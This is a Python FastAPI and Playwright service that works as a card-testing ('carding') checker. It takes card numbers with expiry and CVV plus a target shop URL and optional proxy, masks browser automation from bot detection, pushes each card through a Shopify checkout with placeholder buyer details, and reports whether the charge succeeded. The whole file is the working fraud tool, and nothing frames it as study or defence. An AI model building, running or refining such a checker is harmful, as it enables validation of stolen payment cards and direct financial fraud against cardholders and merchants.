from fastapi import FastAPI, Query
from playwright.async_api import async_playwright
import uvicorn

app = FastAPI()

@app.get("/check")
async def check_card(cc: str = Query(...), site: str = Query(...), proxy: str = Query(None)):
    async with async_playwright() as p:
        browser = await p.chromium.launch(args=["--no-sandbox", "--disable-dev-shm-usage"])
        
        context_args = {
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "viewport": {"width": 1280, "height": 720}
        }
        if proxy:
            context_args["proxy"] = {"server": proxy}
            
        context = await browser.new_context(**context_args)
        await context.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        page = await context.new_page()
        
        try:
            await page.goto(f"{site}/checkout", timeout=60000, wait_until="networkidle")
            
            # محددات شاملة للحقول لتجاوز الـ Timeout
            await page.locator('input[type="email"], input[name*="email"]').first.fill("user@example.com")
            await page.locator('input[name*="firstName"], input[placeholder*="First name"]').first.fill("John")
            await page.locator('input[name*="lastName"], input[placeholder*="Last name"]').first.fill("Doe")
            await page.locator('input[name*="address1"], input[placeholder*="Address"]').first.fill("123 Street")
            
            # الضغط على زر المتابعة
            await page.locator('button[type="submit"], button:has-text("Continue")').first.click()
            await page.wait_for_load_state("networkidle", timeout=15000)
            
            # محاولة تخطي خطوة الشحن
            try:
                await page.locator('button:has-text("Continue to payment")').click(timeout=5000)
                await page.wait_for_load_state("networkidle", timeout=15000)
            except:
                pass

            # التعامل مع حقول الدفع
            await page.wait_for_selector('iframe[title*="payment"]', timeout=20000)
            frame = page.frame_locator('iframe[title*="payment"]')
            
            await frame.locator('input[name*="number"]').fill(cc.split('|')[0])
            await frame.locator('input[name*="expiry"]').fill(f"{cc.split('|')[1]}/{cc.split('|')[2]}")
            await frame.locator('input[name*="verification_value"]').fill(cc.split('|')[3])
            
            await page.locator('button#continue-button, button:has-text("Pay now")').first.click()
            await page.wait_for_load_state("networkidle", timeout=15000)
            
            status = "true" if "thank-you" in page.url or "success" in page.content().lower() else "false"
            await browser.close()
            return {"Gateway": "Shopify Payments", "Response": "CHARGED" if status == "true" else "CARD_DECLINED", "Status": status, "CC": cc}
            
        except Exception as e:
            await browser.close()
            return {"Gateway": "Shopify Payments", "Response": "FAILED", "Details": str(e), "Status": "false", "CC": cc}
